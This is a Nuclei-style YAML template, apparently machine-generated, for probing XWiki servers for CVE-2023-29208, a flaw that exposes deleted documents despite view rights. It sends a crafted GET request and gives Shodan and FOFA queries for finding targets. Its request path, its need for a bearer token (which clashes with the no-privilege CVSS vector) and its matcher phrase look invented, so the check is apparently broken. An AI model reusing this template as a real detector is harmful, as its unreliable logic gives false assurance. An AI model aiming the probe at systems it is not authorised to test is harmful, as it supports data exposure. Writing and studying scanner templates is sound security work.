id: CVE-2023-29208

info:
  name: XWiki Deleted Document Access Control Bypass
  author: ProjectDiscoveryAI
  severity: high
  description: |
    XWiki Commons are technical libraries common to several other top level XWiki projects. Rights added to a document are not taken into account for viewing it once it's deleted. This vulnerability only impacts deleted documents that contained view rights. The issue has been patched in XWiki 14.10.
  impact: |
    An attacker can access sensitive information from deleted documents.
  remediation: |
    Upgrade XWiki to the latest version to fix the access control bypass vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-29208
    cwe-id: CWE-668
    epss-score: 0.00146
    epss-percentile: 0.51804
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
  metadata:
    vendor: xwiki
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"
  tags: intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/xwiki/bin/view/Main/DeletedDocument?rev=deleted:{{randstr}}"

    headers:
      Authorization: Bearer {{token}}
    matchers:
      - type: word
        words:
          - "This document contains sensitive information."
        part: body
